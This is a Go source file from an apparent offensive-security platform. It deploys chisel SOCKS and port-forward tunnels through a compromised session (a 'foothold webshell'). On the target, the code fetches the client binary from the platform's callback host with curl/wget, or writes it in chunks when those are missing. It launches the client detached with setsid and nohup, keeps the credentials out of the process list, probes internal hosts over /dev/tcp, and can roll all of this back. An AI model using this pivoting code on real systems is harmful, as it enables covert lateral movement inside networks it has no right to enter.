// deploy.go は 4 点セットの deploy：① プラットフォーム側で chisel server を起動（プロセス台帳：pid/コマンドライン/
// ログを deploy_params に保存）、② クライアントバイナリを stage の管理下配信でワンタイム URL に変換し、セッション
// 経由でターゲットの /tmp にランダム名でダウンロードして chmod+x（ターゲットに curl/wget がなければセッションの
// 分割書き込み session.WriteFile にフォールバック）、③ リモートでバックグラウンド起動（出力をリダイレクトし、pid は
// センチネルで取得）、④ トンネル内での決定的検証。通って初めて alive を付ける、⑤ いずれかが失敗したら RollbackSteps に従い段階的にロールバック。
package tunnel

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	urlpkg "net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
	"github.com/Autumn-27/artex/stage"
)

// デプロイのタイミングパラメータ。
const (
	serverUpWait   = 2 * time.Second  // server プロセスの即終了検出
	callbackWait   = 25 * time.Second // ターゲットのコールバック待ち（リバース待受口が起きるまで）
	dialProbeEvery = 500 * time.Millisecond
	verifyTimeout  = 8 * time.Second
	remoteExecWait = 120 * time.Second // バイナリのダウンロード（セッションの分割書き込みへのフォールバックを含む）
)

// Manager はトンネルサブシステムのランタイム：デプロイ/検証/ロールバック/ヘルスチェック/回収。管理対象リソースの原則。
// すべての外部露出面（server プロセス、リモートプロセス、stage エントリ、待受ポート）はこれを通して登録・回収する。
type Manager struct {
	store      *db.TunnelStore
	stage      *stage.Manager
	sessions   *session.Registry
	chiselPath string // 空 = バイナリ欠落、Deploy は明確なエラーを返す
	suo5Path   string // 空 = suo5 バイナリ欠落、suo5 アダプタの Deploy は明確なエラーを返す
	suo5PayloadsDir string // 空 = payloads ディレクトリ欠落、同上
	dataDir    string // プラットフォーム側のトンネル作業ディレクトリ（authfile/ログ）
	// OnListenStart/OnListenStop は待受ポート台帳のフック（server 層がポート監査に登録する）。
	OnListenStart func(port int)
	OnListenStop  func(port int)
	// OnStateChange はトンネル状態変化のフック（フェーズ 3b：server 層がタスク MITM 上流のホットスイッチを登録する）。
	// alive/error/stopped のいずれかに確定するたびに発火し、引数は所属タスクの id。
	OnStateChange func(taskID int64)

	procs map[int64]*exec.Cmd // tunnel_id → 本プロセスが起動した server（プロセス台帳のメモリ面）
}

// Options は Manager の組み立て入力。
type Options struct {
	Store      *db.TunnelStore
	Stage      *stage.Manager
	Sessions   *session.Registry
	ChiselPath string // ARTEX_CHISEL_PATH または data/tools/chisel。存在しない場合、Deploy は明確にエラーを返す
	// Suo5Path は suo5 CLI のパス（ARTEX_SUO5_PATH または data/tools/suo5）。
	// Suo5PayloadsDir は payload ディレクトリ（ARTEX_SUO5_PAYLOADS_DIR または data/tools/suo5-payloads）。
	// 欠落時は suo5 アダプタの Deploy だけが明確なエラーを返し、chisel には影響しない。
	Suo5Path        string
	Suo5PayloadsDir string
	DataDir         string
}

// NewManager はランタイムを構築する。chisel が存在すれば sha256 を読んでログ出力する（サプライチェーン自己チェック）。
func NewManager(o Options) (*Manager, error) {
	if o.Store == nil || o.Sessions == nil {
		return nil, fmt.Errorf("tunnel.Manager には store と sessions が必要です")
	}
	dir := filepath.Join(o.DataDir, "tunnels")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, err
	}
	m := &Manager{
		store: o.Store, stage: o.Stage, sessions: o.Sessions,
		chiselPath: o.ChiselPath, dataDir: dir,
		suo5Path: o.Suo5Path, suo5PayloadsDir: o.Suo5PayloadsDir,
		procs: map[int64]*exec.Cmd{},
	}
	if o.ChiselPath != "" {
		if sum, err := fileSHA256(o.ChiselPath); err != nil {
			log.Printf("[tunnel] chisel バイナリを読み取れません（%s）：%v — Deploy は明確なエラーを返します", o.ChiselPath, err)
			m.chiselPath = ""
		} else {
			log.Printf("[tunnel] chisel バイナリ： %s sha256=%s", o.ChiselPath, sum)
		}
	} else {
		log.Printf("[tunnel] chisel バイナリが未設定です（ARTEX_CHISEL_PATH または data/tools/chisel）、tunnel_deploy は明確なエラーを返します")
	}
	if m.suo5Path != "" {
		if sum, err := fileSHA256(m.suo5Path); err != nil {
			log.Printf("[tunnel] suo5 バイナリを読み取れません（%s）：%v — suo5 アダプタの Deploy は明確なエラーを返します", m.suo5Path, err)
			m.suo5Path = ""
		} else {
			log.Printf("[tunnel] suo5 バイナリ： %s sha256=%s", m.suo5Path, sum)
		}
	} else {
		log.Printf("[tunnel] suo5 バイナリが未設定です（ARTEX_SUO5_PATH または data/tools/suo5）、adapter=suo5 は明確なエラーを返します")
	}
	if m.suo5PayloadsDir != "" {
		if st, err := os.Stat(m.suo5PayloadsDir); err != nil || !st.IsDir() {
			log.Printf("[tunnel] suo5 payloads ディレクトリを読み取れません（%s）— suo5 アダプタの Deploy は明確なエラーを返します", m.suo5PayloadsDir)
			m.suo5PayloadsDir = ""
		}
	}
	return m, nil
}

func fileSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

// ChiselPath は検証済みの chisel パスを返す（空 = 欠落）。
func (m *Manager) ChiselPath() string { return m.chiselPath }

// Suo5Path は検証済みの suo5 CLI パスを返す（空 = 欠落）。
func (m *Manager) Suo5Path() string { return m.suo5Path }

// CanListen はプラットフォームのポートを試しにバインドする（ポート割り当ての実検査）。
func CanListen(port int) bool {
	ln, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	if err != nil {
		return false
	}
	_ = ln.Close()
	return true
}

// UsedPorts は稼働中トンネルの台帳が占有するプラットフォームのポートを集計する（listen/socks/local）。
func UsedPorts(recs []*db.TunnelRecord) map[int]bool {
	used := map[int]bool{}
	for _, r := range recs {
		if r.ListenPort > 0 {
			used[r.ListenPort] = true
		}
		var p Plan
		if json.Unmarshal(r.DeployParams, &p) == nil {
			if p.SocksPort > 0 {
				used[p.SocksPort] = true
			}
			if p.LocalPort > 0 {
				used[p.LocalPort] = true
			}
		}
	}
	return used
}

func (m *Manager) saveParams(ctx context.Context, id int64, p *Plan) {
	raw, err := json.Marshal(p)
	if err != nil {
		return
	}
	if err := m.store.UpdateDeployParams(ctx, id, p.RemotePID, raw); err != nil {
		log.Printf("[tunnel] 台帳パラメータの書き戻しに失敗しました (id=%d): %v", id, err)
	}
}

// Deploy は完全なデプロイを実行する：台帳行の作成 → server の起動 → クライアントの配信 → リモートでの起動 →
// 決定的検証 → alive の付与。いずれかが失敗したら段階的にロールバックし（台帳行の削除を含む）、層情報付きのエラーを返す。
// adapter=suo5 のときは deploySuo5 に分岐する（HTTP トンネル、ターゲット側プロセスなし、外向き通信のない状況をカバー）。
func (m *Manager) Deploy(ctx context.Context, p *Plan) (*db.TunnelRecord, error) {
	if p.Adapter == AdapterSuo5 {
		return m.deploySuo5(ctx, p)
	}
	if m.chiselPath == "" {
		return nil, fmt.Errorf("chisel バイナリが見つかりません：対象プラットフォームの chisel を data/tools/chisel に置くか、ARTEX_CHISEL_PATH を設定して再試行してください")
	}
	if p.Kind == KindSocks && p.SocksPort <= 0 || p.Kind == KindPortfwd && p.LocalPort <= 0 {
		return nil, fmt.Errorf("計画に入口ポートがありません（socks_port/local_port）")
	}
	sess, ok := m.sessions.Get(p.ViaSessionID)
	if !ok {
		return nil, fmt.Errorf("セッション %d がレジストリにないため、デプロイできません", p.ViaSessionID)
	}
	rec := &db.TunnelRecord{
		TaskID: p.TaskID, Kind: p.Kind, Adapter: p.Adapter,
		ListenHost: p.ListenHost, ListenPort: p.ListenPort,
		TargetHost: p.TargetHost, TargetPort: p.TargetPort,
		ViaSessionID: p.ViaSessionID, State: db.TunnelDeploying,
	}
	raw, _ := json.Marshal(p)
	rec.DeployParams = raw
	id, err := m.store.Create(ctx, rec)
	if err != nil {
		return nil, fmt.Errorf("台帳の永続化に失敗しました: %w", err)
	}
	if err := m.deployInto(ctx, id, sess, p); err != nil {
		m.rollback(ctx, id, sess, p)
		return nil, err
	}
	if err := m.store.UpdateState(ctx, id, db.TunnelAlive, ""); err != nil {
		log.Printf("[tunnel] 状態の書き戻しに失敗しました (id=%d): %v", id, err)
	}
	m.notifyState(p.TaskID)
	rec, _ = m.store.Get(ctx, id)
	return rec, nil
}

// notifyState は状態変化フックを発火する（server 層はこれでタスク MITM 上流をホットスイッチする）。
func (m *Manager) notifyState(taskID int64) {
	if m.OnStateChange != nil && taskID > 0 {
		m.OnStateChange(taskID)
	}
}

// deployInto は層ごとに進め、各層の成功時点で台帳パラメータを永続化する（プロセス台帳を層ごとに埋める）。
func (m *Manager) deployInto(ctx context.Context, id int64, sess session.Session, p *Plan) error {
	// 層 1：プラットフォーム側 chisel server（authfile 0600、auth はコマンドラインに載せない）。
	if err := os.WriteFile(p.AuthFile, []byte(p.AuthfileContent()), 0o600); err != nil {
		return fmt.Errorf("層 server_process: authfile の書き込みに失敗しました: %w", err)
	}
	logFile, err := os.OpenFile(p.ServerLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("層 server_process: ログのオープンに失敗しました: %w", err)
	}
	cmd := exec.Command(m.chiselPath, p.ServerArgs...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("層 server_process: 起動に失敗しました: %w", err)
	}
	p.ServerPID = cmd.Process.Pid
	m.procs[id] = cmd
	m.saveParams(ctx, id, p)
	if m.OnListenStart != nil {
		m.OnListenStart(p.ListenPort)
	}
	go func() { _ = cmd.Wait(); _ = logFile.Close() }()
	time.Sleep(serverUpWait) // 即終了の検出
	if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
		return fmt.Errorf("層 server_process: chisel server が即終了しました（ログ %s）", p.ServerLog)
	}

	// 層 2：クライアントバイナリの管理下配信（stage のワンタイム URL、curl → wget → セッションの分割書き込み）。
	if err := m.deliver(ctx, sess, p); err != nil {
		return fmt.Errorf("層 stage_entry: %w", err)
	}
	m.saveParams(ctx, id, p)

	// 層 3：リモートでバックグラウンド起動（AUTH は環境変数で渡して ps cmdline に出さない、setsid+nohup でセッションから切り離す）。
	pid, err := m.spawnRemote(ctx, sess, p)
	if err != nil {
		return fmt.Errorf("層 remote_process: %w", err)
	}
	p.RemotePID = pid
	m.saveParams(ctx, id, p)

	// 層 4：トンネル内での決定的検証。リバース待受口の accept ≠ ターゲット到達性なので、実際に接続テストする必要がある。
	if err := m.verify(ctx, sess, p); err != nil {
		return fmt.Errorf("層 verify: %w", err)
	}
	return nil
}

// deliver は stage 経由でクライアントバイナリをターゲットの RemoteBin に配信し、chmod+x する。
func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) error {
	if m.stage == nil {
		return fmt.Errorf("stage 一時保管サービスが有効になっていないため、配信できません")
	}
	entry, err := m.stage.PutFile(m.chiselPath, stage.PutOpts{
		OneShot: true, TaskID: strconv.FormatInt(p.TaskID, 10),
	})
	if err != nil {
		return fmt.Errorf("stage の配信に失敗しました: %w", err)
	}
	p.StageToken = entry.Token
	// stage URL のホストはプラットフォームのメイン待受アドレス（0.0.0.0 のときはループバックのプレースホルダ）で、ターゲットから到達できるとは限らない；
	// callback host（ターゲットがプラットフォームへコールバックする際のアドレス）に置き換え、ポートはメイン待受口を保持する。
	dlURL := rewriteURLHost(entry.URL, p.PlatformAddr)
	dl := fmt.Sprintf(`mkdir -p %s && (curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo ARTEX_DL_OK || echo ARTEX_DL_FAIL`,
		p.RemoteDir, dlURL, p.RemoteBin, p.RemoteBin, dlURL)
	stdout, _, err := sess.Exec(ctx, dl, remoteExecWait)
	if err == nil && strings.Contains(stdout, "ARTEX_DL_OK") {
		return m.chmodRemote(ctx, sess, p)
	}
	// フォールバック：ターゲットに curl/wget がない（またはブロックされた）。セッションの分割書き込みを使う（session.WriteFile が内部で分割する）。
	log.Printf("[tunnel] ターゲットでの直接ダウンロードに失敗し、セッションの分割書き込みにフォールバックします（%s）…", p.RemoteDir)
	data, rerr := os.ReadFile(m.chiselPath)
	if rerr != nil {
		return fmt.Errorf("ローカルの chisel の読み込みに失敗しました: %w", rerr)
	}
	if _, _, err := sess.Exec(ctx, "mkdir -p "+p.RemoteDir, probeTimeout); err != nil {
		return fmt.Errorf("リモートディレクトリの作成に失敗しました: %w", err)
	}
	if err := sess.WriteFile(ctx, p.RemoteBin, data); err != nil {
		return fmt.Errorf("セッションの分割書き込みに失敗しました: %w", err)
	}
	return m.chmodRemote(ctx, sess, p)
}

// rewriteURLHost は stage URL のホスト名を callback host に置き換える（ポートは保持）。
// 解析に失敗したらそのまま返す（正直に縮退し、ダウンロード失敗時はセッションの分割書き込みが受け皿になる）。純粋関数。
func rewriteURLHost(rawURL, platformAddr string) string {
	cbHost, _, err := net.SplitHostPort(platformAddr)
	if err != nil || cbHost == "" {
		return rawURL
	}
	u, err := urlpkg.Parse(rawURL)
	if err != nil || u.Host == "" {
		return rawURL
	}
	_, port, _ := net.SplitHostPort(u.Host)
	if port == "" {
		u.Host = cbHost
	} else {
		u.Host = net.JoinHostPort(cbHost, port)
	}
	return u.String()
}

func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan) error {
	stdout, _, err := sess.Exec(ctx, fmt.Sprintf("chmod +x %s && echo ARTEX_CHMOD_OK || echo ARTEX_CHMOD_FAIL", p.RemoteBin), probeTimeout)
	if err != nil {
		return fmt.Errorf("chmod の実行に失敗しました: %w", err)
	}
	if !strings.Contains(stdout, "ARTEX_CHMOD_OK") {
		return fmt.Errorf("chmod に失敗しました（ターゲットの /tmp が noexec マウントの可能性）: %s", detailOf(stdout))
	}
	return nil
}

// spawnRemote はリモートで client をバックグラウンド起動し、センチネルで実際の pid を取得する。
func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
	// AUTH は env で注入する（chisel client は --auth 未指定時に AUTH env を読む）。auth は
	// ターゲット機の ps cmdline に出ない。トレードオフとして、/proc/<pid>/environ は同一 uid から見えるが、ターゲットは既にフットホールドなので許容する。
	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog)
	stdout, _, err := sess.Exec(ctx, spawn, probeTimeout)
	if err != nil {
		return 0, fmt.Errorf("起動コマンドに失敗しました: %w", err)
	}
	_, after, found := strings.Cut(stdout, "ARTEX_PID=")
	if !found {
		return 0, fmt.Errorf("リモート pid を取得できませんでした（センチネル欠落）: %s", detailOf(stdout))
	}
	pidStr := strings.Fields(after)
	if len(pidStr) == 0 {
		return 0, fmt.Errorf("リモート pid の解析に失敗しました： %s", detailOf(stdout))
	}
	pid, err := strconv.Atoi(strings.TrimSpace(pidStr[0]))
	if err != nil || pid <= 0 {
		return 0, fmt.Errorf("リモート pid が不正です %q", pidStr[0])
	}
	return pid, nil
}

// verify はコールバック入口が起きてから決定的検証を行う。
func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) error {
	entry := m.entryAddr(p)
	// リバース入口が待受を開始するまで待つ（= ターゲットがコールバック済み）。
	deadline := time.Now().Add(callbackWait)
	up := false
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", entry, dialProbeEvery)
		if err == nil {
			_ = conn.Close()
			up = true
			break
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(dialProbeEvery):
		}
	}
	if !up {
		return fmt.Errorf("コールバックがタイムアウトしました（%v 以内に %s が待受を開始せず。外向き通信がブロックされている、またはポート許可リストの可能性があるため、先に tunnel_probe で再確認してください）", callbackWait, entry)
	}
	switch p.Kind {
	case KindSocks:
		// 検証対象の候補を順に試し、いずれかが通ればトンネルは通ったとみなす：
		// 1) 明示的な verify_addr（デフォルト = フットホールド webshell のアドレス。ただし NAT/ポートマッピングを経る場合
		//    このアドレスはターゲット側では意味を持たない。実例：host:8082 がコンテナ：8080 にマッピングされ、コンテナのループバックに 8082 はない）、
		// 2) トンネル自身へのループバック callbackHost:listenPort（chisel server 自身。client は既に接続済み
		//    なのでターゲット側から必ず到達できる）。socks 経由でサーバー側へ接続して戻ってくれば、トンネルが双方向に通信を運べることの証明になり、NAT の仮定を置かずに済む。
		cands := []string{}
		if p.VerifyAddr != "" {
			cands = append(cands, p.VerifyAddr)
		}
		cands = append(cands, p.PlatformAddr)
		var lastErr error
		for _, addr := range cands {
			if addr == "" {
				continue
			}
			if err := socks5Dial(entry, addr, verifyTimeout); err == nil {
				if addr == p.PlatformAddr {
					log.Printf("[tunnel] socks はループバック %s 経由の検証に通りました（トンネルが双方向に通信を運べることを確認）", addr)
				}
				return nil
			} else {
				lastErr = err
			}
		}
		if lastErr != nil {
			return fmt.Errorf("socks5 経由の接続テストがすべての候補で失敗しました（入口が起きた ≠ トンネルが通る）: %w", lastErr)
		}
		log.Printf("[tunnel] socks 入口は起きましたが verify_addr が未指定のため、決定的検証は「入口に接続可能」に降格します")
		return nil
	case KindPortfwd:
		// 事前チェック：ターゲット側から target:port に実際に到達できるか（リバース待受は失敗した接続でも accept するため、入口だけを信じてはいけない）。
		pre := fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo ARTEX_PRE_OK || echo ARTEX_PRE_FAIL`,
			p.TargetHost, p.TargetPort)
		stdout, _, err := sess.Exec(ctx, pre, probeTimeout)
		if err != nil || !strings.Contains(stdout, "ARTEX_PRE_OK") {
			return fmt.Errorf("ターゲット側の事前チェックで %s:%d に到達できません（フットホールドからの実測）: %s", p.TargetHost, p.TargetPort, detailOf(stdout))
		}
		conn, err := net.DialTimeout("tcp", entry, verifyTimeout)
		if err != nil {
			return fmt.Errorf("トンネル経由の %s へのアクセスに失敗しました： %w", entry, err)
		}
		_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
		_, _ = conn.Write([]byte("\r\n")) // 軽いプローブ：一部のサービスは任意のバイトを受けると banner/エラーを返すため、双方向の疎通を証明できる
		_ = conn.Close()
	}
	return nil
}

// entryAddr はプラットフォームのループバック上のトンネル入口（socks5 または転送口）。
func (m *Manager) entryAddr(p *Plan) string {
	port := p.SocksPort
	if p.Kind == KindPortfwd {
		port = p.LocalPort
	}
	return net.JoinHostPort("127.0.0.1", strconv.Itoa(port))
}

// EntryAddr は入口アドレスを外部に公開する（ツールが socks_addr/forward_addr を返すため）。
func (m *Manager) EntryAddr(p *Plan) string { return m.entryAddr(p) }

// PlanDataDir はプラットフォーム側のトンネル作業ディレクトリ（PlanOpts.DataDir で使う）。
func (m *Manager) PlanDataDir() string { return m.dataDir }

// OccupiedPorts は未終了のトンネルが占有するプラットフォームのポートを集計する（ポート割り当て用）。
func (m *Manager) OccupiedPorts(ctx context.Context) (map[int]bool, error) {
	recs, err := m.store.ListActive(ctx)
	if err != nil {
		return nil, err
	}
	return UsedPorts(recs), nil
}

// ActiveRecords は未終了（deploying|alive|error）の台帳行をすべて返す。
func (m *Manager) ActiveRecords(ctx context.Context) ([]*db.TunnelRecord, error) {
	return m.store.ListActive(ctx)
}

// TaskRecords はあるタスクの台帳行をすべて返す。
func (m *Manager) TaskRecords(ctx context.Context, taskID int64) ([]*db.TunnelRecord, error) {
	return m.store.ListByTask(ctx, taskID)
}

// rollback は RollbackSteps に従って段階的にロールバックする（best-effort。各層の失敗はログに記録して続行する）。
func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, p *Plan) {
	log.Printf("[tunnel] デプロイ失敗のため段階的にロールバックします (id=%d)", id)
	if p.RemotePID > 0 {
		m.killRemote(ctx, sess, p)
	}
	if p.RemoteDir != "" {
		_, _, _ = sess.Exec(ctx, "rm -rf "+p.RemoteDir, probeTimeout)
	}
	m.killServer(id, p)
	if p.StageToken != "" && m.stage != nil {
		m.stage.Delete(p.StageToken)
	}
	if p.AuthFile != "" {
		_ = os.Remove(p.AuthFile)
	}
	if err := m.store.Delete(ctx, id); err != nil {
		log.Printf("[tunnel] 台帳行の削除に失敗しました (id=%d): %v", id, err)
	}
}

// killRemote はセッション経由でターゲット側のプロセスを停止する：まず kill -0 と /proc/<pid>/cmdline 内のリモート
// バイナリパスの照合を行い、【リモート】を確認し、pid 再利用による誤停止を防ぐ（PivotHub が自機を確認していた欠陥をここで修正）。
func (m *Manager) killRemote(ctx context.Context, sess session.Session, p *Plan) {
	chk := fmt.Sprintf(`kill -0 %d 2>/dev/null && tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null || echo ARTEX_NO_PROC`, p.RemotePID, p.RemotePID)
	stdout, _, err := sess.Exec(ctx, chk, probeTimeout)
	if err != nil || strings.Contains(stdout, "ARTEX_NO_PROC") {
		return // リモートに既に存在しないため、停止不要
	}
	if !strings.Contains(stdout, p.RemoteBin) && !strings.Contains(stdout, "/ch ") {
		log.Printf("[tunnel] リモート pid %d のコマンドラインに %s が含まれないため（pid 再利用の可能性）、kill をスキップします: %s", p.RemotePID, p.RemoteBin, detailOf(stdout))
		return
	}
	_, _, _ = sess.Exec(ctx, fmt.Sprintf("kill %d 2>/dev/null; sleep 1; kill -9 %d 2>/dev/null", p.RemotePID, p.RemotePID), probeTimeout)
}

// killServer はプラットフォーム側の server プロセスを停止する（本プロセスの台帳ハンドルを優先し、なければ /proc cmdline を照合してから停止する）。
func (m *Manager) killServer(id int64, p *Plan) {
	if cmd, ok := m.procs[id]; ok {
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		delete(m.procs, id)
	} else if p.ServerPID > 0 && serverCmdlineMatches(p) {
		if proc, err := os.FindProcess(p.ServerPID); err == nil {
			_ = proc.Kill()
		}
	}
	if m.OnListenStop != nil {
		m.OnListenStop(p.ListenPort)
	}
}
